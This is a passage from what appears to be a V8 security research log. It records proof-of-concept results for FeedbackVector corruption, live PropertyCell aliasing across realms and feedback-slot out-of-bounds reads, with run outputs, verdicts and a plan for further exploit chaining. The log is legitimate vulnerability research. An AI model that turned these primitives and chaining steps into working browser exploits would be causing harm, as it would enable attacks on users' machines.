- `poc/h42-valid-bytecode-cross-global-live-alias.js`
- `poc/h43-valid-bytecode-cross-global-optimized.js`

Evidence:

- `evidence/h40-linux-sandbox-release.txt`
- `evidence/h40-linux-sandbox-dcheck.txt`
- `evidence/h42-linux-sandbox-release.txt`
- `evidence/h42-linux-sandbox-dcheck.txt`
- `evidence/h43-linux-sandbox-release.txt`
- `evidence/h43-linux-sandbox-dcheck.txt`

H40 copies `g`'s valid global-load `PropertyCell` into `f`'s valid feedback slot:

```text
before f=13 g=99
after f=99 g=99
f_is_A false
f_is_B true
EXIT:0
```

H42 shows the alias is live:

```text
after-corrupt f=99 A=13 B=99
after-A-write f=99 A=44 B=99
after-B-write f=1234 A=44 B=1234
reads_B true
EXIT:0
```

H43 shows optimized caller behavior remains consistent with the corrupted feedback state:

```text
preopt caller=100 f=99
optimized caller=100 f=99
after-B-write caller=124 f=123
EXIT:0
```

Dcheck builds do not flag H40/H42/H43.

Verdict: **CONFIRMED-VALID-BYTECODE-WRONG-GLOBAL-READ / LIVE-PROPERTYCELL-ALIAS**.

This is the cleanest C18 post-corruption primitive so far. It uses valid bytecode and valid `PropertyCell` values, produces deterministic JS-visible wrong-code, survives dcheck, and does not require a crash path. It still requires sandbox memory-corruption API, so it is a sandbox hardening/reportability candidate rather than standalone renderer exploit.

## H44: StoreGlobal cross-slot matrix

PoC: `poc/h44-valid-bytecode-cross-global-store-matrix.js`

Evidence:

- `evidence/h44-linux-sandbox-release-matrix.txt`

Result:

```text
dest=0..8 src=0..8 => A=777 B=99
B777=false
```

Some combinations produce harmless inside-sandbox faults or checks, but no tested slot pair redirects `setA(777)` into `B`.

Verdict: **REFUTED-FOR-STORE-REDIRECT-IN-TESTED-SLOTS**.

## H45: FeedbackVector SFI mismatch

PoC: `poc/h45-valid-bytecode-feedbackvector-sfi-mismatch.js`

Evidence:

- `evidence/h45-linux-sandbox-release.txt`
- `evidence/h45-linux-sandbox-dcheck.txt`

H45 corrupts `FeedbackVector.shared_function_info` to point at a function with different feedback metadata, then optimizes a caller.

Observed release:

```text
before f=13 caller=16
after-corrupt f=13 caller=16
Safely terminating process
Check failed: function.shared(broker).equals(feedback_cell.shared_function_info(broker).value()).
EXIT:0
```

Observed dcheck:

```text
Ignoring debug check failure ... nexus.kind() == FeedbackSlotKind::kLoadGlobal...
Caught harmless signal (SIGTRAP).
EXIT:0
```

Verdict: **CONFIRMED-COMPILER-INVARIANT-CHECK / NO ESCAPE**.

Compiler/broker checks catch this metadata inconsistency before useful miscompile in the tested shape.

## H46-H47: Cross-realm PropertyCell alias

PoCs:

- `poc/h46-valid-bytecode-cross-realm-propertycell.js`
- `poc/h47-valid-bytecode-cross-realm-noaccess-propertycell.js`

Evidence:

- `evidence/h46-linux-sandbox-release.txt`
- `evidence/h46-linux-sandbox-dcheck.txt`
- `evidence/h47-linux-sandbox-release.txt`
- `evidence/h47-linux-sandbox-dcheck.txt`

H46 uses `Realm.createAllowCrossRealmAccess()`. H47 uses plain `Realm.create()`.

Observed release/dcheck:

```text
after-corrupt f=99 g=99
after-writes f=1234 A=44 g=1234
reads_cross_realm_B true
EXIT:0
```

Verdict: **CONFIRMED-CROSS-REALM-WRONG-GLOBAL-READ / DCHECK-CLEAN**.

The valid-bytecode `PropertyCell` alias crosses d8 realms and remains live. This is still under sandbox memory-corruption model, not a browser origin-boundary claim, but it shows the corrupted feedback vector can bypass context/name assumptions at the IC level.

## H10: Construct feedback slot OOB after feedback vector warmup

PoC: `poc/h10-construct-feedback-slot-oob-warm.js`

Mutation:

```text
Construct r0, a0-a0, FBV[2] -> FBV[255]
```

Evidence:

- `evidence/h10-release-interpreter-only.txt`
- `evidence/h10-asan-interpreter-only.txt`

Observed release:

```text
baseline 10
bytecode 35,0,0,212,11,249,116,249,3,1,2,185
mutate-construct 6 2 -> 255
install
run
20
EXIT:0
```

Observed ASAN/dcheck:

```text
CSA_DCHECK failed: IsOffsetInBounds(offset, LoadFeedbackVectorLength(feedback_vector), FeedbackVector::kHeaderSize)
[../../src/builtins/ic.tq:32]
[../../src/interpreter/interpreter-generator.cc:1777]
```

Verdict: **LOW-SIGNAL / DCHECK-ONLY FOR THIS SHAPE**.

Construct feedback slot OOB is accepted and checked in dcheck, but release execution did not crash in this simple shape.

## VRP status

Current status: **not VRP-grade yet**.

Reason:

- H1-H36 reachability uses d8-only test intrinsics.
- Linux `--sandbox-testing` does not report a sandbox boundary violation.
- H6/H8/H9/H11/H12 reach feedback-vector OOB/safe-region memory access, but the Linux sandbox build classifies them as in-sandbox/safe-region.
- H17 creates a deterministic JS-visible wrong value, not a crash.
- H18 shows internal `ScopeInfo` object exposure into JS locals before abort.
- H19/H20 show the exposed internal value crosses into JS object storage and survives GC in release; dcheck builds catch a `TrustedCast<JSAny>` violation.
- H21/H23/H24 show ordinary JS propagation paths can carry the poisoned value without immediate fatal.
- H22/H25 show later JS consumers can hit release fatal checks after the poisoned value is accepted.
- H26-H36 classify more consumers: object copy/introspection/collection/freeze paths propagate; `Array.join`, `typeof`, and `String()` fatal.
- H37/H38 prove the same core issue can be reached with valid bytecode by corrupting `FeedbackVector` state inside the sandbox.
- H39 shows several valid-bytecode `FeedbackVector` poisoning variants produce wrong values or inside-sandbox memory access.
- H40-H43 show valid `PropertyCell` cross-aliasing gives clean wrong-global reads and survives optimized execution.
- H44 does not redirect global stores in tested slots.
- H45 reaches compiler invariant checks but no miscompile.
- H46/H47 show the clean wrong-global read works cross-realm.
- For malformed-bytecode PoCs, reachability is still via d8-only bytecode install intrinsics.
- For H37-H39, reachability is sandbox-corruption-model only: valid bytecode plus direct in-sandbox `FeedbackVector` corruption.
- Natural reachability audit so far did not find a shipped path that writes arbitrary `FeedbackSlot` operands:
  - normal compiler verifies generated bytecode;
  - debug bytecode is a copy of existing bytecode and debug break instrumentation patches opcodes only;
  - embedded feedback can mutate verified bytecode, but through bounded OR updates, not arbitrary feedback-slot indexes.

Why still valuable:

- It identifies a real trust gap between `VerifyFull()` claims and operand coverage.
- The gap sits exactly before `MarkVerified()` publishes trusted bytecode.
- If any normal or sandbox-corruption path can modify `BytecodeArray` operands before or after verification, `kFeedbackSlot` is now the best sink family.
- H17 shows this sink can become execution-integrity divergence, not only DoS.
- H18 suggests the global-load feedback path may be shapable toward internal object exposure, not just numeric/string wrong values.
- H19-H36 move the primitive from "bad return value" to "bad value stored in normal JS heap containers, propagated through ordinary JS operations, then consumed by release IC/JSON/array/coercion paths".
- H37-H47 show bytecode mutation is not required if the attacker can corrupt `FeedbackVector` entries inside the sandbox; the best variant is now clean cross-realm `PropertyCell` aliasing, not crash-only poisoning.

## Next chain work

1. Expand H6/H8/H9 across remaining feedback consumers: keyed loads, named loads with warm IC miss shapes, `DefineKeyedOwnProperty`, `ForIn`, `ToNumber`, `TestTypeOf`, and compare ops.
2. Continue H19-H25 into container consumers not yet covered: `Object.assign`, `Object.values`, `Object.freeze`, `delete`, `Map`/`Set`, `WeakMap` key checks, array `join`/`sort`/`map`, structured clone if available, and overwrite-after-store GC.
3. Shape H18 memory layout to make global-load OOB return a chosen heap object or weak/property-cell path instead of `ScopeInfo`.
4. Mutate handler table and context-slot operands together to seek non-trap corruption instead of immediate unreachable.
5. Test `kCoverageSlot` and immediates in bytecodes whose handlers do real indexed loads/stores.
6. Combine with C21-style in-sandbox corruption where possible: corrupt verified bytecode operands post-`MarkVerified()` and look for out-of-sandbox access under Linux `--sandbox-testing`.
7. Continue bytecode publication audit with code cache/deserialization/debug/live-edit/coverage, but current debug-bytecode path does not create arbitrary operand corruption.
8. Use `--print-bytecode` / handler source to choose bytecodes where unchecked operands index trusted arrays rather than terminating via Torque unreachable.
